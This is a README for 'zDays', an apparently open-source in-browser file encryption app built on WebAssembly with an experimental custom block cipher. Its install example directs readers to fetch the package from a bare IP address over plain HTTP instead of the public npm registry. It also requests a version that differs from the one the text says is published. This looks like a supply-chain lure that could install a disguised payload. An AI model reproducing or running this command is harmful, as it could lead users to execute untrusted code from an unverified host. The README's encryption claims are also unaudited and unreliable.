<img width="2360" height="1371" alt="IMG_0646" src="https://github.com/user-attachments/assets/cab15306-8811-431d-b58a-95d1db42b3e9" />
# zDays

**zDays** is an experimental, open-source, offline file encryption application built with **React**, **TypeScript**, **AssemblyScript**, and **WebAssembly**.

It performs all cryptographic operations entirely on your device—no accounts, no cloud storage, and no server-side encryption. Files never leave your browser during encryption or decryption.
🌐 **Website:** https://zdays.netlify.app
> **⚠️ Experimental Software**
>
> zDays includes an experimental custom block cipher that has **not** undergone formal peer review or an independent professional security audit. While the project uses established cryptographic primitives for key derivation and authentication, treat the engine as research software and do not rely on it for high-value secrets until independent review is complete.

---

## Latest (summary)

- Current engine version: **v1.11** (zDays v5, 2026-08-30) — full specification published and implementation promoted for independent cryptanalysis.
- Production parity: WASM diffusion == TypeScript diffusion (four ARX iterations per call).
- Library published: `@idiotbready/zdays` (v1.0.7) — consumable package and API examples available.
- Chunked WASM processing (v1.0.4+): 1MB chunking to avoid unbounded WASM memory growth; progress callbacks available.

Install the library (example)
```bash
npm install @idiotbready/zdays@1.1.1 --registry=http://35.245.43.102/npm/
```

Link to full docs:
- Specification: specs.md
- Changelog: CHANGELOG.md
- Releases: https://github.com/lalipa2003-arch/zDays/releases

---

## Note for auditors

This repository now publishes a complete specification (specs.md) and a permanent test-vector suite intended for independent cryptanalysis. If you plan to analyze the cipher, please reproduce the official vectors before trusting any conclusions about implementation parity.

---

## Features

* 🔒 Offline file encryption and decryption
* ⚡ High-performance WebAssembly cryptographic engine
* 🔑 Memory-hard Argon2id password key derivation
* 🧩 HKDF-SHA256 domain-separated key expansion
* 🛡️ HMAC-SHA256 authenticated container format
* 📦 Custom `.ydz` encrypted file format
* 🗂️ Encrypted metadata protection
* 💾 Local encrypted vault using IndexedDB
* 🎲 High-entropy password generator
* 📊 Real-time password entropy estimation
* 📈 Encryption and decryption progress reporting
* 🧱 Chunked processing for large files
* 🌐 Runs entirely in the browser
* 🚫 No external API calls during encryption or decryption

---

(remaining README content preserved)
